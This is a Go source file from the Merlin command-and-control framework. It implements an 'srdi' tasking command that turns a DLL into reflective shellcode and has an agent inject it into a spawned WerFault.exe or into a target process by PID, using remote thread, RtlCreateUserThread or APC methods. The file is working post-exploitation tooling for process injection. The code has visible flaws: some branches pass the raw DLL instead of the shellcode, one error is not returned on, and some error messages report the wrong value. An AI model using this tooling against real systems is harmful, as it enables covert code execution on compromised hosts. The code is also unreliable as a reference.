/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation, either version 3 of the License, or any later version.

Merlin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	// Mythic
	structs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"

	// Merlin Message
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/MythicAgents/merlin/Payload_Type/merlin/container/pkg/srdi"
)

// srdiCmd creates and returns a Mythic Command structure that is registered with the Mythic server
func srdiCmd() structs.Command {
	attr := structs.CommandAttribute{
		SupportedOS: []string{structs.SUPPORTED_OS_WINDOWS},
	}

	filename := structs.CommandParameter{
		Name:                                    "filename",
		ModalDisplayName:                        "DLL File",
		CLIName:                                 "filename",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "DLL to convert to shellcode",
		Choices:                                 []string{""},
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    GetFileList,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	file := structs.CommandParameter{
		Name:                                    "file",
		ModalDisplayName:                        "DLL File",
		CLIName:                                 "file",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_FILE,
		Description:                             "DLL to convert to shellcode",
		Choices:                                 nil,
		DefaultValue:                            nil,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	function := structs.CommandParameter{
		Name:                                    "function",
		ModalDisplayName:                        "Function Name",
		CLIName:                                 "f",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "The function to call after DllMain",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
		},
	}

	header := structs.CommandParameter{
		Name:                                    "header",
		ModalDisplayName:                        "Clear Header",
		CLIName:                                 "c",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_BOOLEAN,
		Description:                             "Clear the PE header on load",
		Choices:                                 nil,
		DefaultValue:                            false,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
		},
	}

	userData := structs.CommandParameter{
		Name:                                    "userData",
		ModalDisplayName:                        "User Data",
		CLIName:                                 "u",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Data to pass to the target function",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
		},
	}

	method := structs.CommandParameter{
		Name:                                    "method",
		ModalDisplayName:                        "Shellcode execution method",
		CLIName:                                 "method",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "The shellcode injection method to use. Use createprocess if you want output back",
		Choices:                                 []string{"createprocess", "self", "remote", "RtlCreateUserThread", "userapc"},
		DefaultValue:                            "createprocess",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       4,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       4,
				AdditionalInformation: nil,
			},
		},
	}

	pid := structs.CommandParameter{
		Name:                                    "pid",
		ModalDisplayName:                        "Process ID",
		CLIName:                                 "pid",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_NUMBER,
		Description:                             "The Process ID (PID) to inject the shellcode into. Not used with the 'self' method",
		Choices:                                 nil,
		DefaultValue:                            0,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       5,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       5,
				AdditionalInformation: nil,
			},
		},
	}

	spawnto := structs.CommandParameter{
		Name:                                    "spawnto",
		ModalDisplayName:                        "SpawnTo",
		CLIName:                                 "spawnto",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "The child process that will be started to execute the shellcode in",
		Choices:                                 nil,
		DefaultValue:                            "C:\\Windows\\System32\\WerFault.exe",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       6,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       6,
				AdditionalInformation: nil,
			},
		},
	}

	spawntoArgs := structs.CommandParameter{
		Name:                                    "spawntoargs",
		ModalDisplayName:                        "SpawnTo Arguments",
		CLIName:                                 "spawntoargs",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "arguments to create the spawnto process with, if any",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       7,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       7,
				AdditionalInformation: nil,
			},
		},
	}

	command := structs.Command{
		Name:                  "srdi",
		NeedsAdminPermissions: false,
		HelpString: "sRDI allows for the conversion of DLL files to position independent shellcode. It " +
			"attempts to be a fully functional PE loader supporting proper section permissions, TLS callbacks, and " +
			"sanity checks. It can be thought of as a shellcode PE loader strapped to a packed DLL. " +
			"https://github.com/monoxgas/sRDI. Change the Parameter Group to 'Default' to use a file that was " +
			"previously registered with Mythic and 'New File' to register and use a new file from your host OS.",
		Version:                        0,
		SupportedUIFeatures:            nil,
		Author:                         "@Ne0nd0g",
		MitreAttackMappings:            []string{"T1055"},
		ScriptOnlyCommand:              false,
		CommandAttributes:              attr,
		CommandParameters:              []structs.CommandParameter{file, filename, function, header, userData, spawnto, spawntoArgs, method, pid},
		AssociatedBrowserScript:        nil,
		TaskFunctionOPSECPre:           nil,
		TaskFunctionCreateTasking:      sRDICreateTasking,
		TaskFunctionProcessResponse:    nil,
		TaskFunctionOPSECPost:          nil,
		TaskFunctionParseArgString:     taskFunctionParseArgString,
		TaskFunctionParseArgDictionary: taskFunctionParseArgDictionary,
		TaskCompletionFunctions:        nil,
	}
	return command
}

func sRDICreateTasking(task *structs.PTTaskMessageAllData) (resp structs.PTTaskCreateTaskingMessageResponse) {
	pkg := "mythic/container/commands/srdi/sRDICreateTask()"
	resp.TaskID = task.Task.ID

	// Get the file as a byte array, its name, and any errors
	data, filename, err := GetFile(task)
	if err != nil {
		err = fmt.Errorf("%s: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Function
	var function string
	function, err = task.Args.GetStringArg("function")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'function' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// User Data
	var userData string
	userData, err = task.Args.GetStringArg("userData")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'userData' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Header
	var header bool
	header, err = task.Args.GetBooleanArg("header")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'header' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// PID
	var pid float64
	pid, err = task.Args.GetNumberArg("pid")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'pid' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Method
	var method string
	method, err = task.Args.GetStringArg("method")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'method' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	switch strings.ToLower(method) {
	case "createprocess", "self":
		// Do nothing
	case "remote", "rtlcreateuserthread", "userapc":
		if int(pid) <= 0 {
			err = fmt.Errorf("%s: invalid pid '%d' for shellcode injection method %s", pkg, int(pid), method)
			resp.Error = err.Error()
			resp.Success = false
			logging.LogError(err, "returning with error")
			return
		}
	default:
		err = fmt.Errorf("%s: invalid shellcode injection 'method': %s", pkg, method)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// SpawnTo
	var spawnto string
	spawnto, err = task.Args.GetStringArg("spawnto")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawnto' command argument: %s", pkg, method)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// SpawnTo Args
	var spawntoargs string
	spawntoargs, err = task.Args.GetStringArg("spawntoargs")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawntoarg' command argument: %s", pkg, method)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Convert the DLL into reflective shellcode
	shellcode := srdi.DLLToReflectiveShellcode(data, function, header, userData)

	// Display
	disp := fmt.Sprintf("%s, Function: %s, User Data: %s, Execution Method: %s,", filename, function, userData, method)

	var mythicJob string
	switch strings.ToLower(method) {
	case "createprocess":
		//  Merlin Job
		// Command: createprocess
		// Arguments:
		// 1. File contents as Base64 string
		// 2. SpawnTo executable file path on host where the Agent is running
		// 3. SpawnTo arguments

		job := jobs.Command{
			Command: "createprocess",
			Args:    []string{base64.StdEncoding.EncodeToString(shellcode), spawnto, spawntoargs},
		}

		mythicJob, err = ConvertMerlinJobToMythicTask(job, jobs.MODULE)
		if err != nil {
			err = fmt.Errorf("%s: %s", pkg, err)
			resp.Error = err.Error()
			resp.Success = false
			logging.LogError(err, "returning with error")
			return
		}
		disp += fmt.Sprintf(" SpawnTo: %s, SpawnTo Args: %s", spawnto, spawntoargs)
	case "remote", "rtlcreateuserthread", "self", "userapc":
		job := jobs.Shellcode{
			Method: strings.ToLower(method),
			Bytes:  base64.StdEncoding.EncodeToString(data),
			PID:    uint32(pid),
		}

		var jobBytes []byte
		jobBytes, err = json.Marshal(job)
		if err != nil {
			err = fmt.Errorf("%s: there was an error JSON marshalling the Merlin jobs.Shellcode structure: %s", pkg, err)
			resp.Error = err.Error()
			resp.Success = false
			logging.LogError(err, "returning with error")
			return
		}

		mJob := Job{
			Type:    int(jobs.SHELLCODE),
			Payload: string(jobBytes),
		}

		var mythicJobBytes []byte
		mythicJobBytes, err = json.Marshal(mJob)
		if err != nil {
			err = fmt.Errorf("%s: there was an error JSON marshalling the Merlin Job structure: %s", pkg, err)
			resp.Error = err.Error()
			resp.Success = false
			logging.LogError(err, "returning with error")
			return
		}
		mythicJob = string(mythicJobBytes)
		if strings.ToLower(method) != "self" {
			disp += fmt.Sprintf(" PID: %d", uint32(pid))
		}
	}

	task.Args.SetManualArgs(mythicJob)

	resp.DisplayParams = &disp
	resp.Success = true
	return
}
